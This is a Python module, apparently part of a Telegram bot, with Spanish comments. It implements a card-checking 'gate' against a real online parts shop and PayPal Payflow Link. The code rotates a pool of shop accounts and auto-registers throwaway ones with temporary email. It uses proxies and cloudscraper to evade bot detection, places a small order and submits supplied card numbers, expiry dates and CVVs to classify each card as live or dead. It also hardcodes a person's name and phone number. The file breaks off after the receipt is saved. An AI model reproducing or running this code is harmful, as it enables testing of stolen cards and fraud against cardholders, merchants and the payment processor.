"""Gate Atlas Payflow - Verificación de tarjetas a través de Eastern Surplus + PayPal Payflow Link.

Flujo medido (video + compra real orden 22744, USD 33.62 COM-3207):

    Login manual con cuenta fija (el registro deja en la misma pagina, sin
    autologin y sin correo de verificacion: buzon EmailApi en 0)
      -> Shop/ShoppingCart (btnCheckOut)
      -> Shop/Checkout (btnReviewOrder, con chkTermsOfUse=on + rblDeliveryMethod + ddlShippingOptions)
      -> Shop/ReviewOrder (btnCompleteOrder)
      -> 302 SecurePages/PayFlowProDialog?SecureToken=...&secureTokenId=...
      -> GET payflowlink.paypal.com/?SECURETOKEN=...&SECURETOKENID=...
      -> POST payflowlink.paypal.com/processTransaction.do (campos Payflow, ver hiperion)

Datos de envio/billing: Faker local (la cuenta fija ya trae su direccion;
el checkout pide Shipping Name + Phone + Shipping Options).
"""
import asyncio
import html
import logging
import random
import re
import time
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple

import cloudscraper
from faker import Faker

from bot.config import gate_proxy

logger = logging.getLogger(__name__)

SITE = "https://www.easternsurplus.net"
# Ficha del reflector barato (el de la compra real orden 22744).
PRODUCT_URL = f"{SITE}/PartDetails/321/COM-3207-Round-Red-Reflector-set-pair"
# Condición "Used - $7.00" del dropdown ddlCondition (obligatorio: sin esto
# el Add To Cart pide elegir condición y no mete nada al carrito).
PRODUCT_CONDITION_VALUE = "28"
CART_URL = f"{SITE}/Shop/ShoppingCart.aspx"
CHECKOUT_URL = f"{SITE}/Shop/Checkout"
REVIEW_URL = f"{SITE}/Shop/ReviewOrder"
LOGIN_URL = f"{SITE}/Account/Login"
PAYFLOW_LINK = "https://payflowlink.paypal.com/"

# Pool de cuentas del comercio: data/gates/atlas_accounts.txt (una por
# linea, formato email|password). La primera es la cuenta de prueba
# verificada (orden 22744 real). Si una cuenta falla el login, el gate
# prueba la siguiente y marca la fallida en data/atlas_bad_accounts.jsonl
# para no volver a usarla hasta revisión.
ATLAS_ACCOUNTS_FILE = Path("data/gates/atlas_accounts.txt")
ATLAS_BAD_ACCOUNTS_FILE = Path("data/atlas_bad_accounts.jsonl")

# Si el pool se queda sin cuentas sanas, el gate genera una cuenta nueva
# con EmailApi (correo temporal, sin IMAP) y la agrega al pool. El registro
# del comercio no manda correo de verificación (medido: buzón en 0).
ATLAS_AUTO_REGISTER = True


def _load_atlas_accounts() -> List[Tuple[str, str]]:
    """Lee el pool de cuentas, quitando las marcadas como malas."""
    bad: set = set()
    try:
        import json as _json

        with open(ATLAS_BAD_ACCOUNTS_FILE, encoding="utf-8") as fh:
            for line in fh:
                try:
                    bad.add(_json.loads(line).get("email", "").lower())
                except Exception:
                    pass
    except FileNotFoundError:
        pass
    accounts: List[Tuple[str, str]] = []
    try:
        with open(ATLAS_ACCOUNTS_FILE, encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#") or "|" not in line:
                    continue
                email, pwd = line.split("|", 1)
                email, pwd = email.strip(), pwd.strip()
                if email and pwd and email.lower() not in bad:
                    accounts.append((email, pwd))
    except FileNotFoundError:
        pass
    return accounts


def _mark_atlas_bad(email: str, reason: str) -> None:
    """Marca una cuenta como mala para que el pool la salte."""
    try:
        import json as _json

        ATLAS_BAD_ACCOUNTS_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(ATLAS_BAD_ACCOUNTS_FILE, "a", encoding="utf-8") as fh:
            fh.write(
                _json.dumps(
                    {"ts": time.time(), "email": email, "reason": reason}
                )
                + "\n"
            )
        logger.warning("Cuenta Atlas marcada como mala: %s (%s)", email, reason)
    except Exception as exc:
        logger.debug("No se pudo marcar cuenta mala: %s", exc)


def _add_atlas_account(email: str, pwd: str) -> None:
    """Agrega una cuenta generada al pool."""
    try:
        ATLAS_ACCOUNTS_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(ATLAS_ACCOUNTS_FILE, "a", encoding="utf-8") as fh:
            fh.write(f"\n{email}|{pwd}\n")
        logger.info("Cuenta Atlas generada y agregada: %s", email)
    except Exception as exc:
        logger.warning("No se pudo agregar cuenta Atlas: %s", exc)


def _atlas_register_account(seccion, get_h, post_h) -> Optional[Tuple[str, str]]:
    """Genera una cuenta nueva del comercio con EmailApi y la registra.

    El registro del comercio no manda correo de verificación (medido:
    buzón en 0) y no hay autologin: tras registrar, se entra con LOGIN
    manual. Devuelve (email, password) si quedó logueada, None si no.
    """
    try:
        from bot.services.amazon_gen.credsBypass import TempMail
    except Exception as exc:
        logger.warning("Sin cliente EmailApi para Atlas: %s", exc)
        return None
    mail = TempMail()
    try:
        addr = mail.getAddr()
    except Exception as exc:
        logger.warning("EmailApi no entregó correo para Atlas: %s", exc)
        return None
    email = (addr.get("number") or addr.get("activationId") or "").strip().lower()
    if "@" not in email:
        return None
    pwd = f"Atlas{random.randint(1000, 9999)}!x"
    # El registro vive en /Login (btnCreateAccount) y deja en la misma
    # página; el login posterior es el que suelta la cookie.
    # NOTA: el form de registro completo (First/Last/Phone/dirección) solo
    # se renderiza en navegador; por HTTP el btnCreateAccount no trae esos
    # campos. Se intenta el registro mínimo y se verifica con login.
    try:
        r = seccion.get(LOGIN_URL, headers=get_h, timeout=30)
        data = _form_fields(r.text)
        data["__EVENTTARGET"] = (
            "ctl00$ctl00$globalContent$mainContent$btnCreateAccount"
        )
        data["__EVENTARGUMENT"] = ""
        for key in list(data):
            low = key.lower()
            if low.endswith("txtemailaddress"):
                data[key] = email
            elif low.endswith("txtpassword"):
                data[key] = pwd
        seccion.post(
            LOGIN_URL,
            data=urllib.parse.urlencode(data),
            headers={
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": SITE,
                "referer": LOGIN_URL,
                "user-agent": _UA,
                "x-microsoftajax": "Delta=true",
                "x-requested-with": "XMLHttpRequest",
            },
            timeout=30,
            allow_redirects=True,
        )
        # Login manual con la cuenta recién creada.
        r0 = seccion.get(LOGIN_URL, headers=get_h, timeout=30)
        data = _form_fields(r0.text)
        data["__EVENTTARGET"] = (
            "ctl00$ctl00$globalContent$mainContent$btnLogin"
        )
        data["__EVENTARGUMENT"] = ""
        data["ctl00$ctl00$ScriptMan"] = (
            "ctl00$ctl00$globalContent$mainContent$"
            "ctl00$ctl00$globalContent$mainContent$rdAjaxPanelPanel"
            "|ctl00$ctl00$globalContent$mainContent$btnLogin"
        )
        data["RadAJAXControlID"] = (
            "ctl00_ctl00_globalContent_mainContent_rdAjaxPanel"
        )
        data["__ASYNCPOST"] = "true"
        for key in list(data):
            low = key.lower()
            if low.endswith("txtemailaddress"):
                data[key] = email
            elif low.endswith("txtpassword"):
                data[key] = pwd
        seccion.post(
            LOGIN_URL,
            data=urllib.parse.urlencode(data),
            headers={
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": SITE,
                "referer": LOGIN_URL,
                "user-agent": _UA,
                "x-microsoftajax": "Delta=true",
                "x-requested-with": "XMLHttpRequest",
            },
            timeout=30,
            allow_redirects=True,
        )
        try:
            names = list(seccion.cookies.keys())
        except Exception:
            names = []
        if any("eastern" in n.lower() for n in names):
            _add_atlas_account(email, pwd)
            return email, pwd
        _mark_atlas_bad(email, "registro sin login")
    except Exception as exc:
        logger.debug("Registro Atlas falló para %s: %s", email, exc)
    return None


def atlas_pool_health() -> Dict[str, object]:
    """Salud del pool sin gastar checks: cuentas sanas vs marcadas malas."""
    total = 0
    try:
        with open(ATLAS_ACCOUNTS_FILE, encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if line and not line.startswith("#") and "|" in line:
                    total += 1
    except FileNotFoundError:
        pass
    bad = 0
    try:
        with open(ATLAS_BAD_ACCOUNTS_FILE, encoding="utf-8") as fh:
            bad = sum(1 for line in fh if line.strip())
    except FileNotFoundError:
        pass
    healthy = _load_atlas_accounts()
    return {"total": total, "bad": bad, "healthy": len(healthy)}

_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)


def _debug_save_receipt(step: str, status_code: int, body: str) -> None:
    """Guarda el recibo de Payflow redactado (sin PAN) para diagnóstico."""
    try:
        debug_dir = Path("data/atlas_debug")
        debug_dir.mkdir(parents=True, exist_ok=True)
        redacted = re.sub(r"\d{12,19}", "[PAN]", body)
        content = f"STEP: {step}\nSTATUS: {status_code}\n--- BODY ---\n{redacted[:20000]}\n"
        (debug_dir / f"{step}_{int(time.time())}.txt").write_text(content, encoding="utf-8")
    except Exception:
        pass


def _learn_atlas_text(body: str, result: str = "", respmsg: str | None = None) -> None:
    """Diccionario vivo: guarda cada banner/texto nuevo del comercio.

    Cada línea de data/atlas_texts.jsonl trae RESULT + RESPMSG + los textos
    visibles (banners/alerts) para armar el catálogo sin capturas. El texto
    rojo del declined cae aquí solo con usar el gate.
    """
    try:
        from bs4 import BeautifulSoup
    except Exception:
        return
    try:
        soup = BeautifulSoup(body or "", "html.parser")
        texts = []
        for el in soup.find_all(["div", "span", "p", "h1", "h2", "h3", "li", "td"]):
            cls = " ".join(el.get("class", [])).lower()
            tid = (el.get("id") or "").lower()
            if any(
                k in cls or k in tid
                for k in ("success", "error", "alert", "danger", "warning", "notice", "message", "banner")
            ):
                t = el.get_text(" ", strip=True)
                if t and len(t) < 500:
                    texts.append(t)
        if not texts:
            return
        import json as _json

        seen = set()
        try:
            with open("data/atlas_texts.jsonl", encoding="utf-8") as fh:
                for line in fh:
                    try:
                        seen.add(_json.loads(line).get("text", ""))
                    except Exception:
                        pass
        except FileNotFoundError:
            pass
        with open("data/atlas_texts.jsonl", "a", encoding="utf-8") as fh:
            for t in dict.fromkeys(texts):
                if t not in seen:
                    fh.write(
                        _json.dumps(
                            {"ts": time.time(), "result": result, "respmsg": respmsg or "", "text": t},
                            ensure_ascii=False,
                        )
                        + "\n"
                    )
                    seen.add(t)
    except Exception as exc:
        logger.debug("No se pudo aprender texto atlas: %s", exc)


def _pick_proxy() -> Optional[dict]:
    """Proxy para el flujo: sticky MX primero, rotatorio si el sticky falla."""
    for pool in ("mx", "rot"):
        proxy_url = gate_proxy(pool)
        if proxy_url:
            return {"http": proxy_url, "https": proxy_url}
    return None


def _swap_proxy(seccion, pool: str = "rot") -> bool:
    """Cambia el proxy de la sesión en caliente (para reintento)."""
    proxy_url = gate_proxy(pool)
    if not proxy_url:
        return False
    seccion.proxies = {"http": proxy_url, "https": proxy_url}
    return True


def _form_fields(html: str) -> dict:
    """Todos los inputs+selects del form WebForms (ViewState incluido)."""
    from bs4 import BeautifulSoup

    soup = BeautifulSoup(html, "html.parser")
    data: dict = {}
    for inp in soup.find_all("input"):
        name = inp.get("name")
        if not name:
            continue
        # Los botones (submit/button) NO se mandan en el postback del
        # navegador: solo viajan hidden/text/password + selects.
        if (inp.get("type") or "").lower() in ("submit", "button"):
            continue
        data[name] = inp.get("value", "")
    for sel in soup.find_all("select"):
        name = sel.get("name")
        if not name:
            continue
        opts = sel.find_all("option")
        chosen = [o for o in opts if o.get("selected")]
        data[name] = (
            chosen[0].get("value", "")
            if chosen
            else (opts[0].get("value", "") if opts else "")
        )
    return data


def procesar_y_validar(card: str) -> Optional[Tuple[str, str, str, str]]:
    """Valida y procesa el formato de la tarjeta."""
    def es_fecha_anterior(mes, ano):
        fecha_actual = datetime.now().strftime("%Y-%m")
        fecha_proporcionada = f"{'20' + ano}-{mes:02}"
        return fecha_proporcionada >= fecha_actual

    KEYS = "/#%&()=?¿!¡*[]{}-_.:,;|@+"
    for KEY in KEYS:
        card = card.replace(KEY, "|")
    card = card.replace(" ", "|")

    match = re.search(r"\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}", card)
    if not match:
        return None

    values = card.split("|")
    if len(values) < 4:
        return None

    cc_number = values[0]
    mes = values[1]
    ano = values[2]
    ano = ano[2:] if len(ano) > 2 else ano
    cvv = values[3][0:4]

    if not es_fecha_anterior(mes, ano):
        return None

    return cc_number, mes, ano, cvv


def parseX(data, start, end):
    """Extrae texto entre dos delimitadores (None si no existe)."""
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None



def _err(tiempo: str) -> Dict[str, str]:
    """Error sanitizado para Telegram: sin detalle técnico.

    Todo lo que no sea veredicto de tarjeta (Live/Dead con su detalle del
    procesador) sale como error genérico. El detalle real queda en
    data/atlas_debug/ para revisión. Los Dead NO pasan por aquí: conservan
    su RESULT/RESPMSG/PNREF porque aún no hay dead map.
    """
    return {
        "status": "⚠️ Error",
        "message": "Error, avisar a un admin.",
        "time": tiempo,
    }


async def atlas_check(card_data: str, user_id: Optional[int] = None) -> Dict[str, str]:
    """Verifica una sola tarjeta contra Eastern Surplus + Payflow Link."""
    logger.info(f"Atlas gate: inicio check user_id={user_id}")

    loop = asyncio.get_event_loop()

    def _run() -> Dict[str, str]:
        inicio = datetime.now()
        login_email = ""
        try:
            resultado = procesar_y_validar(card_data)
            if resultado is None:
                return {
                    "status": "⚠️ Error",
                    "message": "Formato de tarjeta inválido. Usa: cc|mes|año|cvv",
                    "time": "0.00",
                }
            cc_number, mes, ano, cvv = resultado

            # Datos de envio/billing: la cuenta del pool ya trae su dirección
            # (la de prueba: Arturo Ibarra / Waterbury Court / San Jose CA).
            # El checkout NO se llena (el sitio trae los datos guardados).
            # Solo se usan nombre/apellido/teléfono para el payload Payflow.
            # Sin links de verificacion: el registro no manda correo
            # (buzon EmailApi en 0) y no hay autologin.
            faker = Faker()
            nombre = "Arturo"
            apellido = "Ibarra"
            phone = "8120095412"
            street = faker.street_address() or "Waterbury Court"
            city = faker.city() or "San Jose"
            state_abbr = faker.state_abbr() or "CA"
            zip_code = re.sub(r"\D", "", faker.postcode() or "")[:5] or "95117"
            email = login_email or ""

            seccion = cloudscraper.create_scraper(
                browser={"browser": "chrome", "platform": "windows", "mobile": False},
                delay=2,
            )

            proxy = _pick_proxy()
            if proxy:
                seccion.proxies = proxy

            get_h = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "en-US,en;q=0.9",
                "upgrade-insecure-requests": "1",
                "user-agent": _UA,
            }
            post_h = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "user-agent": _UA,
                "x-microsoftajax": "Delta=true",
                "x-requested-with": "XMLHttpRequest",
            }

            # --- Paso 1: login con rotación del pool ---
            # Prueba cada cuenta de data/gates/atlas_accounts.txt; la que no
            # entra se marca en data/atlas_bad_accounts.jsonl y se prueba la
            # siguiente. Si el pool se agota y ATLAS_AUTO_REGISTER está
            # activo, se genera una cuenta nueva con EmailApi.
            try:
                r0 = seccion.get(LOGIN_URL, headers=get_h, timeout=30)
            except Exception:
                # El sticky MX puede tirar 504: reintentar con rotatorio.
                if not _swap_proxy(seccion, "rot"):
                    raise
                r0 = seccion.get(LOGIN_URL, headers=get_h, timeout=30)
            login_email = ""
            login_ok = False
            for _attempt, (_email, _pwd) in enumerate(
                _load_atlas_accounts()
            ):
                data = _form_fields(
                    r0.text if _attempt == 0 else seccion.get(
                        LOGIN_URL, headers=get_h, timeout=30
                    ).text
                )
                data["__EVENTTARGET"] = (
                    "ctl00$ctl00$globalContent$mainContent$btnLogin"
                )
                data["__EVENTARGUMENT"] = ""
                data["ctl00$ctl00$ScriptMan"] = (
                    "ctl00$ctl00$globalContent$mainContent$"
                    "ctl00$ctl00$globalContent$mainContent$rdAjaxPanelPanel"
                    "|ctl00$ctl00$globalContent$mainContent$btnLogin"
                )
                data["RadAJAXControlID"] = (
                    "ctl00_ctl00_globalContent_mainContent_rdAjaxPanel"
                )
                data["__ASYNCPOST"] = "true"
                for key in list(data):
                    low = key.lower()
                    if low.endswith("txtemailaddress"):
                        data[key] = _email
                    elif low.endswith("txtpassword"):
                        data[key] = _pwd
                seccion.post(
                    LOGIN_URL,
                    data=urllib.parse.urlencode(data),
                    headers={
                        "accept": "*/*",
                        "accept-language": "en-US,en;q=0.9",
                        "cache-control": "no-cache",
                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "origin": SITE,
                        "referer": LOGIN_URL,
                        "user-agent": _UA,
                        "x-microsoftajax": "Delta=true",
                        "x-requested-with": "XMLHttpRequest",
                    },
                    timeout=30,
                    allow_redirects=True,
                )
                try:
                    names = list(seccion.cookies.keys())
                except Exception:
                    names = []
                if any("eastern" in n.lower() for n in names):
                    login_email = _email
                    login_ok = True
                    break
                _mark_atlas_bad(_email, "login sin cookie .EasternSurplus")
                # Sesión quemada con login fallido: renovarla antes de probar
                # la siguiente cuenta.
                try:
                    seccion.cookies.clear()
                except Exception:
                    pass
                r0 = seccion.get(LOGIN_URL, headers=get_h, timeout=30)
            if not login_ok:
                if ATLAS_AUTO_REGISTER:
                    _gen = _atlas_register_account(seccion, get_h, post_h)
                    if _gen:
                        login_email, _ = _gen
                        login_ok = True
            if not login_ok:
                tiempo = f"{float((datetime.now() - inicio).total_seconds()):0.2f}"
                return _err(tiempo)

            # --- Paso 2: ficha del reflector + condición Used ($7.00) + Add To Cart ---
            # Sin elegir ddlCondition el sitio pide "Please choose a part condition"
            # y no mete nada al carrito (medido en navegador). El botón es
            # type=button (no viaja en el form): el target se saca por regex.
            # El carrito ACUMULA cantidad entre intentos: si ya trae piezas de
            # un intento anterior, se vacían con btnRemove (X naranja, pide
            # confirm pero el postback entra directo) para que el cargo sea
            # 1x USD 7.00 con Pickup.
            r0c = seccion.get(CART_URL, headers=get_h, timeout=30)
            try:
                _rm = re.search(
                    r'name="(ctl00\$[^"]*btnRemove)"', r0c.text
                )
                while _rm and "no results to display" not in r0c.text.lower():
                    _d = _form_fields(r0c.text)
                    _d["__EVENTTARGET"] = _rm.group(1)
                    _d["__EVENTARGUMENT"] = ""
                    seccion.post(
                        CART_URL,
                        data=urllib.parse.urlencode(_d),
                        headers={**post_h, "referer": CART_URL, "origin": SITE},
                        timeout=30,
                        allow_redirects=True,
                    )
                    r0c = seccion.get(CART_URL, headers=get_h, timeout=30)
                    _rm = re.search(
                        r'name="(ctl00\$[^"]*btnRemove)"', r0c.text
                    )
            except Exception:
                pass
            r1 = seccion.get(PRODUCT_URL, headers=get_h, timeout=40)
            data = _form_fields(r1.text)
            cond_key = next(
                (k for k in data if k.lower().endswith("ddlcondition")), None
            )
            if cond_key:
                data[cond_key] = PRODUCT_CONDITION_VALUE
            m_btn = re.search(
                r'name="(ctl00\$[^"]*btnAddToCart)"', r1.text
            )
            if not m_btn:
                tiempo = f"{float((datetime.now() - inicio).total_seconds()):0.2f}"
                return _err(tiempo)
            target = m_btn.group(1)
            data["__EVENTTARGET"] = target
            data["__EVENTARGUMENT"] = ""
            r2 = seccion.post(
                PRODUCT_URL,
                data=urllib.parse.urlencode(data),
                headers={**post_h, "referer": PRODUCT_URL, "origin": SITE},
                timeout=30,
                allow_redirects=True,
            )
            _ = r2

            # --- Paso 3: carrito (qty=1 + Update + Estimate) -> checkout ---
            # Medido en navegador: los 3 POST son ASYNC (ScriptMan=<panel>|
            # <botón>, RadAJAXControlID=<panel>, __ASYNCPOST=true). Sin ese
            # formato el Update no aplica y el CheckOut no avanza.
            _PANEL = (
                "ctl00$ctl00$globalContent$mainContent$"
                "ctl00$ctl00$globalContent$mainContent$rdAjaxPanelPanel"
            )
            _RAD = "ctl00_ctl00_globalContent_mainContent_rdAjaxPanel"

            def _async(data, target):
                data["__EVENTTARGET"] = target
                data["__EVENTARGUMENT"] = ""
                data["ctl00$ctl00$ScriptMan"] = f"{_PANEL}|{target}"
                data["RadAJAXControlID"] = _RAD
                data["__ASYNCPOST"] = "true"
                return data

            r3 = seccion.get(CART_URL, headers=get_h, timeout=30)
            if "no results to display" in r3.text.lower():
                tiempo = f"{float((datetime.now() - inicio).total_seconds()):0.2f}"
                return _err(tiempo)
            data = _form_fields(r3.text)
            qty_key = next(
                (k for k in data if "txtProductQty" in k), None
            )
            if qty_key:
                data[qty_key] = "1"
            data = _async(
                data,
                "ctl00$ctl00$globalContent$mainContent$btnUpdate",
            )
            seccion.post(
                CART_URL,
                data=urllib.parse.urlencode(data),
                headers={**post_h, "referer": CART_URL, "origin": SITE},
                timeout=30,
                allow_redirects=True,
            )
            r3b = seccion.get(CART_URL, headers=get_h, timeout=30)
            data = _form_fields(r3b.text)
            if qty_key and qty_key in data:
                data[qty_key] = "1"
            for k in list(data):
                low = k.lower()
                if low.endswith("ddlcountry"):
                    data[k] = "UNITED STATES"
                elif low.endswith("txtzipcode") and not data[k]:
                    data[k] = zip_code
            data = _async(
                data,
                "ctl00$ctl00$globalContent$mainContent$btnCalculateShipping",
            )
            seccion.post(
                CART_URL,
                data=urllib.parse.urlencode(data),
                headers={**post_h, "referer": CART_URL, "origin": SITE},
                timeout=30,
                allow_redirects=True,
            )
            r3c = seccion.get(CART_URL, headers=get_h, timeout=30)
            data = _form_fields(r3c.text)
            data = _async(
                data,
                "ctl00$ctl00$globalContent$mainContent$btnCheckOut",
            )
            r4 = seccion.post(
                CART_URL,
                data=urllib.parse.urlencode(data),
                headers={**post_h, "referer": CART_URL, "origin": SITE},
                timeout=30,
                allow_redirects=True,
            )
            _ = r4

            # --- Paso 4: checkout -> review ---
            # Medido en navegador: NO se llena nada (el sitio trae los datos
            # guardados de la cuenta: Arturo Ibarra / Waterbury Court / etc).
            # Solo el POST async de btnReviewOrder.
            r5 = seccion.get(CHECKOUT_URL, headers=get_h, timeout=30)
            data = _form_fields(r5.text)
            data["__EVENTTARGET"] = (
                "ctl00$ctl00$globalContent$mainContent$btnReviewOrder"
            )
            data["__EVENTARGUMENT"] = ""
            data["ctl00$ctl00$ScriptMan"] = (
                "ctl00$ctl00$globalContent$mainContent$"
                "ctl00$ctl00$globalContent$mainContent$rdAjaxPanelPanel"
                "|ctl00$ctl00$globalContent$mainContent$btnReviewOrder"
            )
            data["RadAJAXControlID"] = (
                "ctl00_ctl00_globalContent_mainContent_rdAjaxPanel"
            )
            data["__ASYNCPOST"] = "true"
            r6 = seccion.post(
                CHECKOUT_URL,
                data=urllib.parse.urlencode(data),
                headers={
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "accept-language": "en-US,en;q=0.9",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": SITE,
                    "referer": CHECKOUT_URL,
                    "upgrade-insecure-requests": "1",
                    "user-agent": _UA,
                },
                timeout=30,
                allow_redirects=True,
            )
            _ = r6

            # --- Paso 5: review -> PayFlowProDialog (PICKUP, sin envío) ---
            # Medido en navegador: rblDeliveryMethod=2 (Pickup, sucursal
            # 1331 O'Reilly Drive) habilita el botón sin shipping y el cargo
            # queda en USD 7.00. Secuencia: chkTermsOfUse -> rbl $1 (Pickup)
            # -> btnCompleteOrder. Sin ddlShippingOptions (queda en 0).
            r7 = seccion.get(REVIEW_URL, headers=get_h, timeout=30)
            data = _form_fields(r7.text)
            data["__EVENTTARGET"] = (
                "ctl00$ctl00$globalContent$mainContent$chkTermsOfUse"
            )
            data["__EVENTARGUMENT"] = ""
            data["ctl00$ctl00$ScriptMan"] = (
                "ctl00$ctl00$globalContent$mainContent$"
                "ctl00$ctl00$globalContent$mainContent$rdAjaxPanelPanel"
                "|ctl00$ctl00$globalContent$mainContent$chkTermsOfUse"
            )
            data["RadAJAXControlID"] = (
                "ctl00_ctl00_globalContent_mainContent_rdAjaxPanel"
            )
            data["__ASYNCPOST"] = "true"
            data["ctl00$ctl00$globalContent$mainContent$chkTermsOfUse"] = "on"
            data["ctl00$ctl00$globalContent$mainContent$rblDeliveryMethod"] = "1"
            r7b = seccion.post(
                REVIEW_URL,
                data=urllib.parse.urlencode(data),
                headers={**post_h, "referer": REVIEW_URL, "origin": SITE},
                timeout=30,
                allow_redirects=True,
            )
            chk_html = r7b.text if isinstance(r7b.text, str) else r7.text
            data = _form_fields(chk_html)
            data["__EVENTTARGET"] = (
                "ctl00$ctl00$globalContent$mainContent"
                "$rblDeliveryMethod$1"
            )
            data["__EVENTARGUMENT"] = ""
            data["ctl00$ctl00$ScriptMan"] = (
                "ctl00$ctl00$globalContent$mainContent$"
                "ctl00$ctl00$globalContent$mainContent$rdAjaxPanelPanel"
                "|ctl00$ctl00$globalContent$mainContent$rblDeliveryMethod$1"
            )
            data["RadAJAXControlID"] = (
                "ctl00_ctl00_globalContent_mainContent_rdAjaxPanel"
            )
            data["__ASYNCPOST"] = "true"
            data["ctl00$ctl00$globalContent$mainContent$chkTermsOfUse"] = "on"
            data["ctl00$ctl00$globalContent$mainContent$rblDeliveryMethod"] = "2"
            data.pop(
                "ctl00$ctl00$globalContent$mainContent$ddlShippingOptions",
                None,
            )
            r7c = seccion.post(
                REVIEW_URL,
                data=urllib.parse.urlencode(data),
                headers={**post_h, "referer": REVIEW_URL, "origin": SITE},
                timeout=30,
                allow_redirects=True,
            )
            ship_html = r7c.text if isinstance(r7c.text, str) else chk_html
            data = _form_fields(ship_html)
            data["__EVENTTARGET"] = (
                "ctl00$ctl00$globalContent$mainContent$btnCompleteOrder"
            )
            data["__EVENTARGUMENT"] = ""
            data["ctl00$ctl00$ScriptMan"] = (
                "ctl00$ctl00$globalContent$mainContent$"
                "ctl00$ctl00$globalContent$mainContent$rdAjaxPanelPanel"
                "|ctl00$ctl00$globalContent$mainContent$btnCompleteOrder"
            )
            data["RadAJAXControlID"] = (
                "ctl00_ctl00_globalContent_mainContent_rdAjaxPanel"
            )
            data["__ASYNCPOST"] = "true"
            data["ctl00$ctl00$globalContent$mainContent$chkTermsOfUse"] = "on"
            data["ctl00$ctl00$globalContent$mainContent$rblDeliveryMethod"] = "2"
            data.pop(
                "ctl00$ctl00$globalContent$mainContent$ddlShippingOptions",
                None,
            )
            r8 = seccion.post(
                REVIEW_URL,
                data=urllib.parse.urlencode(data),
                headers={**post_h, "referer": REVIEW_URL, "origin": SITE},
                timeout=30,
                allow_redirects=False,
            )
            dialog_url = r8.headers.get("location", "") or ""
            m = re.search(r"SecureToken=([^&\"']+)", r8.text or "")
            m2 = re.search(r"secureTokenId=([^&\"']+)", r8.text or "", re.I)
            if (not dialog_url or "PayFlowProDialog" not in dialog_url) and not m:
                tiempo = f"{float((datetime.now() - inicio).total_seconds()):0.2f}"
                return _err(tiempo)
            if dialog_url.startswith("/"):
                dialog_url = SITE + dialog_url
            r9 = seccion.get(dialog_url, headers=get_h, timeout=30)
            sec_match = re.search(r"[Ss]ecure[Tt]oken=([^&\"']+)", r9.text)
            sid_match = re.search(r"[Ss]ecure[Tt]oken[Ii]d=([^&\"']+)", r9.text)
            securetoken = sec_match.group(1) if sec_match else (m.group(1) if m else "")
            securetokenid = (
                sid_match.group(1) if sid_match else (m2.group(1) if m2 else "")
            )
            if not securetoken or not securetokenid:
                tiempo = f"{float((datetime.now() - inicio).total_seconds()):0.2f}"
                return _err(tiempo)

            # --- Paso 6: Payflow Link (igual que hiperion pasos 9-10) ---
            headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": SITE + "/",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": _UA,
            }
            params = {"SecureTokenID": securetokenid, "SecureToken": securetoken}
            r10 = seccion.get(PAYFLOW_LINK, params=params, headers=headers, timeout=30)

            csrf_match = re.search(
                r'name="CSRF_TOKEN" type="hidden" value="([^"]+)"', r10.text
            )
            if not csrf_match:
                tiempo = f"{float((datetime.now() - inicio).total_seconds()):0.2f}"
                return _err(tiempo)
            csrf = csrf_match.group(1)

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://payflowlink.paypal.com",
                "referer": f"https://payflowlink.paypal.com/?SecureTokenID={securetokenid}&SecureToken={securetoken}",
                "upgrade-insecure-requests": "1",
                "user-agent": _UA,
            }
            data_pf = [
                ("subaction", ""),
                ("CARDNUM", cc_number),
                ("EXPMONTH", mes),
                ("EXPYEAR", ano),
                ("startdate_month", ""),
                ("startdate_year", ""),
                ("issue_number", ""),
                ("METHOD", "C"),
                ("PAYMETHOD", "C"),
                ("FIRST_NAME", nombre),
                ("LAST_NAME", apellido),
                ("template", ""),
                ("ADDRESS", street),
                ("CITY", city),
                ("STATE", state_abbr),
                ("ZIP", zip_code),
                ("COUNTRY", "US"),
                ("PHONE", ""),
                ("EMAIL", ""),
                ("SHIPPING_FIRST_NAME", nombre),
                ("SHIPPING_LAST_NAME", apellido),
                ("ADDRESSTOSHIP", street),
                ("CITYTOSHIP", city),
                ("STATETOSHIP", state_abbr),
                ("ZIPTOSHIP", zip_code),
                ("COUNTRYTOSHIP", "US"),
                ("PHONETOSHIP", ""),
                ("EMAILTOSHIP", ""),
                ("TYPE", "A"),
                ("SHIPAMOUNT", "0.00"),
                ("TAX", "0.00"),
                ("VERBOSITY", "HIGH"),
                ("flag3dSecure", ""),
                ("CURRENCY", "USD"),
                ("swipeData", "0"),
                ("SECURETOKEN", securetoken),
                ("SECURETOKENID", securetokenid),
                ("PARMLIST", ""),
                ("MODE", ""),
                ("CSRF_TOKEN", csrf),
                ("referringTemplate", "minlayout"),
            ]
            r11 = seccion.post(
                "https://payflowlink.paypal.com/processTransaction.do",
                headers=headers,
                data=data_pf,
                timeout=40,
            )

            tiempo = f"{float((datetime.now() - inicio).total_seconds()):0.2f}"
            source = r11.text
            _debug_save_receipt("s11_receipt", r11.status_code, source)

